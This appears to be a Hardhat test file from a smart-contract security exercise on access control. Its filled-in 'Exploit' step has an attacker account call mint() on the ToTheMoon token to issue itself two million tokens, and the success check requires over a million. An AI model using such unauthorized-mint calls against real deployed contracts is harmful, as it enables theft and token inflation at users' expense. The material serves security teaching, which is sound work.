const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Access Control Exercise 2', function () {

    let deployer, user1, attacker;
    INITIAL_MINT = ethers.utils.parseEther("1000")
    USER_MINT = ethers.utils.parseEther("10")

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, attacker] = await ethers.getSigners();
        
        const ToTheMoonFactory = await ethers.getContractFactory(
            'contracts/access-control-2/ToTheMoon.sol:ToTheMoon',
            deployer
        );
        // const ToTheMoonFactory = await ethers.getContractFactory(
        //     'contracts/access-control-2/solution/ToTheMoonSecured.sol:ToTheMoonSecured',
        //     deployer
        // );
        this.toTheMoon = await ToTheMoonFactory.deploy(INITIAL_MINT);

        await this.toTheMoon.mint(user1.address, USER_MINT)
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        await this.toTheMoon.connect(attacker).mint(attacker.address, ethers.utils.parseEther("2000000"))
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Attacker has 1 million tokens
        expect(await this.toTheMoon.balanceOf(attacker.address)).to.be.gt((
            ethers.utils.parseEther("1000000")
        ));
        
    });
});
